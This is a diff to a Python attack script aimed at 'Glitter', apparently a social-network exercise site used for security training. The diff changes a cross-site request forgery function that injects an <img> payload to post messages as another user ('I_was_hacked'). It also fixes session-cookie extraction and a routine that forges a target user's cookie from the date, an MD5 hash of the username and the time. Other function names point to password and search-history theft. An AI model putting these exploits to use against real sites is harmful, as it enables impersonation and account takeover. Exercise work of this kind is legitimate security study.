@@ -2,6 +2,7 @@ import socket
 import time
 import requests
 import hashlib
+import datetime
 
 SERVER_PORT = 1336
 SERVER_IP = "44.224.228.136"
@@ -284,9 +285,22 @@ def send_multiple_wows(glit_id, count):
         time.sleep(0.5)
 
 
-def xsrf_send_message_to_yourself_from_another_user():
-    msg = """<img src="http://glitter.org.il/glit?id=-1&feed_owner_id=""" + str(user_id) + """&publisher_id=""" + str(target_user_id) + """&publisher_screen_name=hacked_user&publisher_avatar=im1&background_color=White&date=""" + str(current_time) + """&content=I_was_hacked&font_color=black">"""
-    send_and_receive_website("GET", "glit?id=-1&feed_owner_id=23695&publisher_id=23695&publisher_screen_name=kolin%20pom&publisher_avatar=im1&background_color=White&date=2025-07-08T16:50:31.133Z&content=" + msg + "&font_color=black")
+def xsrf_send_message_to_yourself_from_another_user(publisher_id):
+    msg = (
+        f'<img src="http://glitter.org.il/glit?id=-1&feed_owner_id={user_id}'
+        f'&publisher_id={publisher_id}'
+        f'&publisher_screen_name=hacked_user&publisher_avatar=im1'
+        f'&background_color=White&date={current_time}'
+        f'&content=I_was_hacked&font_color=black">'
+    )
+    path = (
+        f'glit?id=-1&feed_owner_id={user_id}'
+        f'&publisher_id={publisher_id}'
+        f'&publisher_screen_name=kolin%20pom&publisher_avatar=im1'
+        f'&background_color=White&date={current_time}'
+        f'&content={msg}&font_color=black'
+    )
+    send_and_receive_website("GET", path)
 
 
 def login_website():
@@ -303,7 +317,8 @@ def extract_sparkle_cookie(response_text):
     if '"sparkle":"' in response_text:
         start = response_text.find('"sparkle":"') + len('"sparkle":"')
         end = response_text.find('"', start)
-        cookie = response_text[start:end]
+        sparkle = response_text[start:end]
+        cookie = {"sparkle": sparkle}
 
 
 def get_password():
@@ -324,11 +339,11 @@ def load_another_user_search_history():
 
 
 def generate_cookie(target_username):
-    now = time.now()
+    now = datetime.datetime.now()
     date_str = now.strftime("%d%m%Y")
     hour = str(int(now.strftime("%H")))
     minute = now.strftime("%M")
     time_str = hour + minute
-    username_hash = hashlib.md5(username.encode()).hexdigest()
+    username_hash = hashlib.md5(target_username.encode()).hexdigest()
     generated_cookie = date_str + "." + username_hash + "." + time_str + "." + date_str
     return generated_cookie
